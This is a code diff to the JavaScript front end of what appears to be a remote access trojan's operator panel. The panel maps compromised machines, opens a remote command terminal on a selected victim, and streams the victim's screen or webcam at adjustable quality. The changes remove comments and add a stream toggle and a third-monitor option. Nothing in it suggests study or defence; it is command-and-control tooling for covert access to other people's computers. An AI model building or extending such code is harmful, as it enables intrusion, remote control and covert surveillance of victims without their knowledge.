@@ -31,7 +31,6 @@ const FS_POLL_TIMEOUT = 20000;
 // ==========================================
 // UTILITIES
 // ==========================================
-// Bulletproof coordinate parser to prevent Leaflet NaN crashes
 function getSafeCoord(val, isLat) {
     const defaultCoord = isLat ? 28.5383 : -81.3792;
     if (val === undefined || val === null || val === '') return defaultCoord;
@@ -78,10 +77,9 @@ function initMap() {
         bounds: worldBounds
     }).addTo(leafletMap);
 
-    // Forces Leaflet to recalibrate after mounting
     setTimeout(() => {
         leafletMap.invalidateSize(true);
-        renderMap(); // Ensure dots populate once map boots
+        renderMap(); 
     }, 100);
 }
 
@@ -205,7 +203,6 @@ async function fetchData() {
         const logsData = await logsResponse.json();
         globalData = logsData;
 
-        // Function to safely transition and pan the map
         const transitionToControlPanel = () => {
             switchTab('rat');
             setTimeout(() => {
@@ -298,15 +295,12 @@ window.selectNode = function(nodeId) {
     appendTerminalText(`Session established. Authenticated as: ${nodeId}`, "system");
     document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via secure reverse proxy`;
     
-    // Automatically update panels with the target ID if they are idle
     document.getElementById('fs-active-node').innerText = nodeId;
-    document.getElementById('liveViewTitle').innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-500 mr-2"></i>Stream: ${nodeId}`;
 
     if (terminalPollInterval) {
         clearInterval(terminalPollInterval);
     }
     
-    // NEW: Real Terminal Polling Loop
     terminalPollInterval = setInterval(async () => {
         if (!activeNodeId) return;
         try {
@@ -319,9 +313,7 @@ window.selectNode = function(nodeId) {
                     data.outputs.forEach(out => appendTerminalText(out, "output"));
                 }
             }
-        } catch(e) {
-            // Silently fail polling to prevent console spam
-        }
+        } catch(e) {}
     }, 2000); 
 };
 
@@ -329,7 +321,6 @@ function appendTerminalText(msg, type="system") {
     const term = document.getElementById('terminal-output');
     if(!term) return;
     
-    // Remove the blinking prompt temporarily
     const promptEl = term.querySelector('.terminal-prompt');
     if (promptEl) promptEl.remove();
 
@@ -346,7 +337,6 @@ function appendTerminalText(msg, type="system") {
     }
     term.appendChild(line);
     
-    // Re-add the blinking prompt at the bottom
     const prompt = document.createElement('div'); 
     prompt.className = "mt-2 text-green-400 terminal-prompt flex flex-shrink-0"; 
     prompt.innerHTML = `<span class="mr-2">C:\\Users\\System></span> <span class="cursor-blink"></span>`;
@@ -363,7 +353,6 @@ window.executeTermCommand = function(inputEl) {
     const val = inputEl.value.trim();
     if(!val) return;
     
-    // Print user input to screen immediately
     appendTerminalText(`C:\\Users\\System> ${val}`, "user");
     
     setTimeout(() => {
@@ -420,11 +409,23 @@ async function sendCommandToNode(deviceId, command) {
 // ==========================================
 // LIVE VIEW STREAMING (MULTI-MONITOR + SLIDER)
 // ==========================================
+window.toggleStream = function() {
+    if (!activeNodeId) {
+        return showToast("No active node selected!", "error");
+    }
+    if (streamInterval) {
+        stopStream();
+    } else {
+        const type = activeStream.type || 'screen';
+        const monitor = activeStream.monitor !== undefined ? activeStream.monitor : -1;
+        startStream(type, monitor);
+    }
+};
+
 window.changeStreamQuality = function(val) {
     activeQuality = parseInt(val);
-    document.getElementById('qualityLabel').innerText = `Q: ${activeQuality}`;
-    if (activeStream.type) {
-        // Send updated config to payload mid-stream dynamically
+    document.getElementById('qualityLabel').innerText = `Q:${activeQuality}`;
+    if (activeStream.type && streamInterval) {
         let streamTarget = activeStream.type === 'screen' ? `SCREEN_${activeStream.monitor}` : 'WEBCAM';
         sendCommandToNode(activeNodeId, `START_STREAM:${streamTarget}|${activeQuality}`);
     }
@@ -452,15 +453,19 @@ window.startStream = async function(type, monitorIndex = -1) {
     const monitorControls = document.getElementById('monitorControls');
     const imageEl = document.getElementById('liveViewImage');
     const spinner = document.getElementById('liveViewSpinner');
+    const toggleBtn = document.getElementById('streamToggleBtn');
     
     spinner.style.display = 'flex';
     spinner.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-2xl mb-2"></i><p class="text-gray-500 font-mono text-[10px]">Awaiting frames...</p>`;
     imageEl.src = "";
     imageEl.style.display = 'none';
 
+    // Update Toggle Button to Stop State
+    toggleBtn.className = "w-4 h-4 rounded-full bg-red-500/20 text-red-500 hover:bg-red-500 hover:text-white flex items-center justify-center text-[8px]";
+    toggleBtn.innerHTML = '<i class="fa-solid fa-stop"></i>';
+
     let streamTarget = type === 'screen' ? `SCREEN_${monitorIndex}` : 'WEBCAM';
 
-    // Slider UI injected inline
     let sliderHtml = `
         <div class="flex items-center gap-1 border-l border-gray-700 pl-2 ml-1">
             <span class="text-[9px] text-gray-500" title="High FPS, Low Quality"><i class="fa-solid fa-gauge-high"></i></span>
@@ -476,6 +481,7 @@ window.startStream = async function(type, monitorIndex = -1) {
             <button onclick="startStream('screen', -1)" class="px-2 py-0.5 text-[9px] rounded ${monitorIndex === -1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-800 text-gray-400 hover:text-white'}">ALL</button>
             <button onclick="startStream('screen', 0)" class="px-2 py-0.5 text-[9px] rounded ${monitorIndex === 0 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-800 text-gray-400 hover:text-white'}">M1</button>
             <button onclick="startStream('screen', 1)" class="px-2 py-0.5 text-[9px] rounded ${monitorIndex === 1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-800 text-gray-400 hover:text-white'}">M2</button>
+            <button onclick="startStream('screen', 2)" class="px-2 py-0.5 text-[9px] rounded ${monitorIndex === 2 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-800 text-gray-400 hover:text-white'}">M3</button>
         `;
         monitorControls.innerHTML = monButtons + sliderHtml;
         monitorControls.classList.remove('hidden');
@@ -522,15 +528,23 @@ window.stopStream = function() {
         sendCommandToNode(activeNodeId, "STOP_STREAM");
         termLog(`Stream stopped for ${activeNodeId}.`);
     }
-    activeStream.type = null;
 
     // Reset UI to idle
+    const toggleBtn = document.getElementById('streamToggleBtn');
+    if (toggleBtn) {
+        toggleBtn.className = "w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]";
+        toggleBtn.innerHTML = '<i class="fa-solid fa-play"></i>';
+    }
+    
     document.getElementById('liveViewTitle').innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-500 mr-2"></i>Live Stream`;
     document.getElementById('monitorControls').classList.add('hidden');
     document.getElementById('liveViewImage').style.display = 'none';
+    
     const spinner = document.getElementById('liveViewSpinner');
-    spinner.style.display = 'flex';
-    spinner.innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-700 text-3xl mb-2"></i><p class="text-gray-500 font-mono text-[10px]">Stream Idle</p>`;
+    if(spinner) {
+        spinner.style.display = 'flex';
+        spinner.innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-700 text-3xl mb-2"></i><p class="text-gray-500 font-mono text-[10px]">Stream Idle</p>`;
+    }
 };
 
 // ==========================================
@@ -876,7 +890,6 @@ window.switchTab = function(tabId) {
         
     document.getElementById('tab-' + tabId).className = `px-6 py-1.5 rounded-md font-bold text-sm transition-all ${activeColor}`;
 
-    // Safely waits until the RAT view is rendered to give Leaflet a real DOM size.
     if (tabId === 'rat') {
         if (!leafletMap) {
             initMap();
